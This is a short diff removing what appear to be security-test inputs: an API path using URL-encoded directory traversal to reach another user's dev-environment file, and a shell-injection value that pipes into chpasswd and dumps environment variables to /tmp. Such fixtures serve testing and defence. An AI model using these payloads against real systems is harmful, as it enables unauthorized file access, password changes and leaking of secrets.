@@ -1,6 +1,0 @@
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-dr3ca04nks433tsaeq5ni4m1lm4fljqvrthdzme2xkoz1jlagorwsgeunwky
-
-/api/devenv/{own}/files/main.c?uuid={own}%2F..%2F{target}
-
-password | chpasswd; printenv > /tmp/test; #
